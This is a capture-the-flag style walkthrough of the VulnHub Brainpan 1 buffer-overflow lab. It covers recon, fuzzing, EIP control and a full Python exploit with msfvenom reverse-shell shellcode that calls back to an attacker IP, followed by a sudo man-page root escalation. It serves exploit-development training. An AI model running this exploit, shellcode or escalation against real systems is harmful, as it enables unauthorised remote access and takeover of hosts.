---
description: https://www.vulnhub.com/entry/brainpan-1,51/
icon: flask-gear
---

# Brainpain (BoF Lab)

<div align="left"><figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption><p><a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></p></figcaption></figure></div>

🔗 [Brainpain 1](https://www.vulnhub.com/entry/brainpan-1,51/)

<details>

<summary>readme.txt (Disclaimer and Setup)</summary>

#### Description

```
 _               _                         
| |__  _ __ __ _(_)_ __  _ __   __ _ _ __  
| '_ \| '__/ _` | | '_ \| '_ \ / _` | '_ \ 
| |_) | | | (_| | | | | | |_) | (_| | | | |
|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_|
                        |_|                
                            by superkojiman  
                 http://www.techorganic.com

DISCLAIMER
----------
By using this virtual machine, you agree that in no event will I be liable 
for any loss or damage including without limitation, indirect or 
consequential loss or damage, or any loss or damage whatsoever arising 
from loss of data or profits arising out of or in connection with the use 
of this software.

TL;DR: If something bad happens, it's not my fault.



SETUP
-----
Brainpan has been tested and found to work on the following hypervisors:
-    VMware Player 5.0.1
-    VMWare Fusion 5.0
-    VirtualBox 4.2.8

Import Brainpan into your preferred hypervisor and configure the network 
settings to your needs. It will get an IP address via DHCP, but it's 
recommended you run it within a NAT or visible to the host OS only since it
is vulnerable to attacks.
```

Source: Brainpan.zip/readme.txt

```
MD5 (brainpan.ova) = fc0f163220b9884df5dcc9cdc45361e4
```

Source: Brainpan.zip/md5.txt

Exclusive to VulnHub!

</details>

<details>

<summary>How to install Wine and Ollydbg on Linux</summary>

[https://computingforgeeks.com/how-to-install-wine-on-debian/](https://computingforgeeks.com/how-to-install-wine-on-debian/)

[https://www.kali.org/tools/ollydbg/](https://www.kali.org/tools/ollydbg/) or `sudo apt install ollydbg`

</details>

{% hint style="info" %}
In alternative you can install others sw such as: [Immunity Debugger ](https://www.immunityinc.com/products/debugger/)and execute it using Wine on Linux OS or on [Windows OS](https://www.microsoft.com/es-es/software-download/windows10) (in this case you should transfer the executable brainpain.exe).
{% endhint %}

<details>

<summary>How to install Mona modules (optional)</summary>

* Download Mona modules from here: [https://github.com/corelan/mona/blob/master/mona.py](https://github.com/corelan/mona/blob/master/mona.py)
* Extract archive downloaded and copy the mona.py file to OllyDBG/ImmDBG PyCommands folder.

</details>

## Task 1 - Deploy the machine

Deploy attacker machine (Kali) and Brainpain machine on VirtualBox, Vmware or on a compatible emulator:

<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

and check relative IPs:

🐲 Attacker/Kali IP: `192.168.56.7`  obtained using `ip a`&#x20;

<figure><img src="../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

The Brainpain VM is on the same subnet, than we do host discovery with nmap or arp-scan only in our subnet: `nmap 192.168.56.0/24`

```bash
Nmap scan report for 192.168.56.8
Host is up (0.00015s latency).
```

🎯 Target IP: `192.168.56.8`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

## Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "192.168.56.8 brainpain" >> /etc/hosts
</strong>
mkdir -p vulnhub/brainpain
cd vulnhub/brainpain
<strong>mkdir {nmap,content,exploits,scripts}
</strong># At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 brainpain
PING brainpain (192.168.56.8) 56(84) bytes of data.
64 bytes from brainpain (192.168.56.8): icmp_seq=1 ttl=64 time=0.670 ms
64 bytes from brainpain (192.168.56.8): icmp_seq=2 ttl=64 time=0.441 ms
64 bytes from brainpain (192.168.56.8): icmp_seq=3 ttl=64 time=0.390 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system, while Windows systems usually have a TTL of 128 secs.

### 2.1 Ports in listening and relative services

```bash
nmap --open -p0- -sS -n -Pn -vvv --min-rate 5000 brainpain -oG nmap/port_scan
```

```bash
PORT      STATE SERVICE          REASON
9999/tcp  open  abyss            syn-ack ttl 64
10000/tcp open  snet-sensor-mgmt syn-ack ttl 64
```

There're two open port, analyze them searching more info about services version and potential vulns:

```bash
nmap --open -p 9999,10000 -sCV -n -Pn -vvv -A brainpain -oN nmap/open_port
```

```bash
PORT      STATE SERVICE REASON         VERSION
9999/tcp  open  abyss?  syn-ack ttl 64
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.94SVN%I=7%D=12/30%Time=65906D34%P=x86_64-pc-linux-gnu%
SF:r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINP
SF:AN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENT
SF:ER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>Pn</td><td>no ping</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

We see that on port 1000 there's a web server, than we can try to open it on a browser.

<figure><img src="../../.gitbook/assets/image (21) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and this is relative page source code:

<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see that it is a static page with only an image included.

While on port 9999 there's an hypotetic login form, but without possibility to insert input.

<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now, we try to find potential hidden directory using gobuster:

```bash
gobuster dir -u http://brainpain:10000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://brainpain:10000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 301) [Size: 0] [--> /bin/]
Progress: 199331 / 220561 (90.37%)[ERROR] Get "http://brainpain:10000/OpenDoorLogoShadow": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

and we find an interesting path: [http://brainpain:10000/bin/](http://brainpain:10000/bin/)

Going to it we find an interesting file exe, that we can download in locally:

<figure><img src="../../.gitbook/assets/image (25) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Check more info about executable using command file:

```bash
file brainpan.exe 
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows, 5 sections
```

that confirms exe windows file. Run it using windows emulator (wine):

```bash
wine brainpan.exe
```

<div align="left"><figure><img src="../../.gitbook/assets/image (26) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Program was waiting a connection on port 9999, then we can use netcat on localhost and the same port:

```bash
nc 127.0.0.1 9999
```

<figure><img src="../../.gitbook/assets/image (27) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

now we can interact with login shell and insert psw (that we don't know).

Reading first tab page, after psw input we can see output that displays: \[get\_reply] copied 9 bytes to buffer. It means that program returns output of copied bytes to buffer and we can use it to test potential BoF vulnerability.

## Task 3 - BoF Exploitation

### 3.1 Fuzzing

We can try to test sw using a fuzzer script in python:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500
```

<figure><img src="../../.gitbook/assets/image (35) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

add it into offset variable of our script:

```python
#!/usr/bin/python
import socket, sys
from struct import pack
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 9999))
offset = b"Ju8Ju9Jv0Jv1Jv2Jv3Jv4Jv5Jv6Jv7Jv8Jv9Jw0Jw1Jw2Jw3Jw4Jw5Jw6Jw7Jw8Jw9Jx0Jx1Jx2Jx3Jx4Jx5Jx6Jx7Jx8Jx9Jy0Jy1Jy2Jy3Jy4Jy5Jy6Jy7Jy8Jy9Jz0Jz1Jz2Jz3Jz4Jz5Jz6Jz7Jz8Jz9Ka0Ka1Ka2Ka3Ka4Ka5Ka6Ka7Ka8Ka9Kb0Kb1Kb2Kb3Kb4Kb5Kb6Kb7Kb8Kb9Kc0Kc1Kc2Kc3Kc4Kc5Kc6Kc7Kc8Kc9Kd0Kd1Kd2Kd3Kd4Kd5Kd6Kd7Kd8Kd9Ke0Ke1Ke2Ke3Ke4Ke5Ke6Ke7Ke8Ke9Kf0Kf1Kf2Kf3Kf4Kf5Kf6Kf7Kf8Kf9Kg0Kg1Kg2Kg3Kg4Kg5Kg6Kg7Kg8Kg9Kh0Kh1Kh2Kh3Kh4Kh5Kh6Kh7Kh8Kh9Ki0Ki1Ki2Ki3Ki4Ki5Ki6Ki7Ki8Ki9Kj0Kj1Kj2Kj3Kj4Kj5Kj6Kj7Kj8Kj9Kk0Kk1Kk2Kk3Kk4Kk5Kk6Kk7Kk8Kk9Kl0Kl1Kl2Kl3Kl4Kl5Kl6Kl7Kl8Kl9Km0Km1Km2Km3Km4Km5Km6Km7Km8Km9Kn0Kn1Kn2Kn3Kn4Kn5Kn6Kn7Kn8Kn9Ko0Ko1Ko2Ko3Ko4Ko5Ko6Ko7Ko8Ko9Kp0Kp1Kp2Kp3Kp4Kp5Kp6Kp7Kp8Kp9Kq0Kq1Kq2Kq3Kq4Kq5Kq6Kq7Kq8Kq9Kr0Kr1Kr2Kr3Kr4Kr5Kr6Kr7Kr8Kr9Ks0Ks1Ks2Ks3Ks4Ks5Ks6Ks7Ks8Ks9Kt0Kt1Kt2Kt3Kt4Kt5Kt6Kt7Kt8Kt9Ku0Ku1Ku2Ku3Ku4Ku5Ku6Ku7Ku8Ku9Kv0Kv1Kv2Kv3Kv4Kv5Kv6Kv7Kv8Kv9Kw0Kw1Kw2Kw3Kw4Kw5Kw6Kw7Kw8Kw9Kx0Kx1Kx2Kx3Kx4Kx5Kx6Kx7Kx8Kx9Ky0Ky1Ky2Ky3Ky4Ky5Ky6Ky7Ky8Ky9Kz0Kz1Kz2Kz3Kz4Kz5Kz6Kz7Kz8Kz9La0La1La2La3La4La5La6La7La8La9Lb0Lb1Lb2Lb3Lb4Lb5Lb6Lb7Lb8Lb9Lc0Lc1Lc2Lc3Lc4Lc5Lc6Lc7Lc8Lc9Ld0Ld1Ld2Ld3Ld4Ld5Ld6Ld7Ld8Ld9Le0Le1Le2Le3Le4Le5Le6Le7Le8Le9Lf0Lf1Lf2Lf3Lf4Lf5Lf6Lf7Lf8Lf9Lg0Lg1Lg2Lg3Lg4Lg5Lg6Lg7Lg8Lg9Lh0Lh1Lh2Lh3Lh4Lh5Lh6Lh7Lh8Lh9Li0Li1Li2Li3Li4Li5Li6Li7Li8Li9Lj0Lj1Lj2Lj3Lj4Lj5Lj6Lj7Lj8Lj9Lk0Lk1Lk2Lk3Lk4Lk5Lk6Lk7Lk8Lk9Ll0Ll1Ll2Ll3Ll4Ll5Ll6Ll7Ll8Ll9Lm0Lm1Lm2Lm3Lm4Lm5Lm6Lm7Lm8Lm9Ln0Ln1Ln2Ln3Ln4Ln5Ln6Ln7Ln8Ln9Lo0Lo1Lo2Lo3Lo4Lo5Lo6Lo7Lo8Lo9Lp0Lp1Lp2Lp3Lp4Lp5Lp6Lp7Lp8Lp9Lq0Lq1Lq2Lq3Lq4Lq5Lq6Lq7Lq8Lq9Lr0Lr1Lr2Lr3Lr4Lr5Lr6Lr7Lr8Lr9Ls0Ls1Ls2Ls3Ls4Ls5Ls6Ls7Ls8Ls9Lt0Lt1Lt2Lt3Lt4Lt5Lt6Lt7Lt8Lt9Lu0Lu1Lu2Lu3Lu4Lu5Lu6Lu7Lu8Lu9Lv0Lv1Lv2Lv3Lv4Lv5Lv6Lv7Lv8Lv9Lw0Lw1Lw2Lw3Lw4Lw5Lw6Lw7Lw8Lw9Lx0Lx1Lx2Lx3Lx4Lx5Lx6Lx7Lx8Lx9Ly0Ly1Ly2Ly3Ly4Ly5Ly6Ly7Ly8Ly9Lz0Lz1Lz2Lz3Lz4Lz5Lz6Lz7Lz8Lz9Ma0Ma1Ma2Ma3Ma4Ma5Ma6Ma7Ma8Ma9Mb0Mb1Mb2Mb3Mb4Mb5Mb6Mb7Mb8Mb9Mc0Mc1Mc2Mc3Mc4Mc5Mc6Mc7Mc8Mc9Md0Md1Md2Md3Md4Md5Md6Md7Md8Md9Me0Me1Me2Me3Me4Me5Me6Me7Me8Me9Mf0Mf1Mf2Mf3Mf4Mf5Mf6Mf7Mf8Mf9Mg0Mg1Mg2Mg3Mg4Mg5Mg6Mg7Mg8Mg9Mh0Mh1Mh2Mh3Mh4Mh5Mh6Mh7Mh8Mh9Mi0Mi1Mi2Mi3Mi4Mi5Mi6Mi7Mi8Mi9Mj0Mj1Mj2Mj3Mj4Mj5Mj6Mj7Mj8Mj9Mk0Mk1Mk2Mk3Mk4Mk5Mk6Mk7Mk8Mk9Ml0Ml1Ml2Ml3Ml4Ml5Ml6Ml7Ml8Ml9Mm0Mm1Mm2Mm3Mm4Mm5Mm6Mm7Mm8Mm9Mn0Mn1Mn2Mn3Mn4Mn5Mn6Mn7Mn8Mn9Mo0Mo1Mo2Mo3Mo4Mo5Mo6Mo7Mo8Mo9Mp0Mp1Mp2Mp3Mp4Mp5Mp6Mp7Mp8Mp9Mq0Mq1Mq2Mq3Mq4Mq5Mq6Mq7Mq8Mq9Mr0Mr1Mr2Mr3Mr4Mr5Mr6Mr7Mr8Mr9Ms0Ms1Ms2Ms3Ms4Ms5Ms6Ms7Ms8Ms9Mt0Mt1Mt2Mt3Mt4Mt5Mt6Mt7Mt8Mt9Mu0Mu1Mu2Mu3Mu4Mu5Mu6Mu7Mu8Mu9Mv0Mv1Mv2M"
buffer = offset
sock.send(buffer)
sock.close()
```

<figure><img src="../../.gitbook/assets/image (28) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (30) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

program was crashed and we need to copy value of EIP register

<div align="left"><figure><img src="../../.gitbook/assets/image (31) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

EIP value in hexadecimal: 35724134

Now, we need to use pattern\_offset ruby script with EIP value to calculate correct number of byte needed to crash app:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
```

<div align="left"><figure><img src="../../.gitbook/assets/image (36) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Output means that program cashes after 524 bytes.

### 3.2 Control EIP

Our scope is to overwrite EIP register and put into command to jump to ESP register (where we'll insert our payload/shellcode) and force execution, then we can try to put into EIP register 4 character of letter B (42 hex), using fuzzer below:

```python
#!/usr/bin/python
import socket, sys
from struct import pack
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 9999))
offset = b"A" * 524
eip = b"B" * 4
buffer = offset + eip
sock.send(buffer)
sock.close()
```

<div align="left"><figure><img src="../../.gitbook/assets/image (37) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Now we've insert 524 letter A (41 hex) and 4 letter B (42 hex), infact we can see that EIP value is: 42424242.

Next goal is to overwrite EIP putting JMP ESP value, then find JMP ESP address

<div align="left"><figure><img src="../../.gitbook/assets/image (38) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

JMP ESP address is: 311712F3, to convert in little endian format: \xF3\x12\x17\x31

In the next fuzzer script we need to add this value to EIP and put 400 letter C to ESP (400 because payload usually is 350 bytes):

```python
#!/usr/bin/python
import socket, sys
from struct import pack
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 9999))
offset = b"A" * 524
eip = b'\xF3\x12\x17\x31'
esp = b"C" * 400
buffer = offset + eip + esp
sock.send(buffer)
sock.close()
```

<details>

<summary>Badchars Check (Optional for this lab)</summary>

We already have control over the EIP, the next step will be to know the BADCHARS. Basically we need to know which characters are bad or invalid for the payload. These characters are those that could interfere with the execution of our payload or cause unexpected behavior.

There are several ways to create them, we can go to [Badchars – GitHub](https://github.com/cytopia/badchars) and copy the badchars into our script.

</details>

{% embed url="https://github.com/cytopia/badchars" %}

All right, ow we need to replace the 400 C's of the ESP with our shellcode:

### 3.3 Shellcode generation

```bash
msfvenom -p linux/x86/shell/reverse_tcp -b \x00 LHOST=192.168.56.7 LPORT=5555 -f python
```

<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

in the below script to prevent i've add before shellcode a sequence of NOP chars to prevent the inexact memory addresses matter. NOP sleds help align the actual shellcode to a specific memory address. In some cases, the payload needs to be aligned to a particular memory boundary for successful execution. NOP sleds provide a flexible way to achieve this alignment. Of course NOP operations will be not executed and program will pass directly to our shell code inserted into buf variable.

```bash
#!/usr/bin/python
import socket, sys
from struct import pack
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 9999))
offset = b"A" * 524
eip = b'\xF3\x12\x17\x31'
nop_chars = b'\x90' * 20
buf =  b""
buf += b"\xb8\x7e\xbd\x16\xa7\xdb\xc4\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x1f\x31\x42\x15\x03\x42\x15\x83\xea"
buf += b"\xfc\xe2\x8b\xd7\x1c\xf9\x42\xf3\xd6\xe6\xf7\x40"
buf += b"\x4a\x83\xf5\xf6\x0a\xda\x18\x3b\x52\x4b\x81\xac"
buf += b"\x93\xdc\x0d\x2a\x7c\x1f\x6d\x21\xcf\x96\x8c\x23"
buf += b"\x49\xf1\x1e\xe5\xc2\x88\x7f\x46\x20\x0a\xfa\x89"
buf += b"\xc3\x12\x4a\x7e\x09\x4d\xf0\x7e\x71\x8d\xac\x14"
buf += b"\x71\xe7\x49\x60\x92\xc6\x98\xbf\xd5\xac\xda\x39"
buf += b"\x6b\x45\xfd\x0b\x94\x23\x01\x7c\x9b\x53\x88\x9f"
buf += b"\x5a\xb8\x86\x9e\xbe\x33\x26\x5d\x8c\xcc\xc3\x5e"
buf += b"\x76\xdd\x90\xd7\x66\x44\x94\xcc\xd8\x74\x15\x8c"
buf += b"\x9c\xbb\xdd\x8f\x61\xda\xa5\x91\x9d\x1d\xd5\x2a"
buf += b"\x9c\x1d\xd5\x4c\x52\x9d"
buffer = offset + eip + nop_chars + buf
sock.send(buffer)
sock.close()
```

First to execute it, we need to listening it on the same port of shellcode IP and PORT running a multi handler on msfconsole:&#x20;

<div align="left"><figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

Then we can run our shellcode script to brainpain machine (192.168.56.8):

```bash
python3 shellcode.py 192.168.56.8
```

Connection was established on port 5555, and we've obtained a reverse shell

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Task 4 - Privilege Escalation

```bash
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
python -c 'import pty; pty.spawn("/bin/bash");'
puck@brainpan:/home/puck$
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

We can execute `/home/anansi/bin/anansi_util` as root:

```bash
sudo -u root /home/anansi/bin/anansi_util
```

<div align="left"><figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

The program accepts manual option + command. Taking tentatives i can see that manual refers to linux man function. Then, i can use it to open a man page regarding a command (e.g. ls) and inserit into a `!/bin/sh` to became root.&#x20;

```bash
sudo -u root /home/anansi/bin/anansi_util manual ls
```

<div align="left"><figure><img src="../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

save it, and we'll obtain root permissions!

<div align="left"><figure><img src="../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>
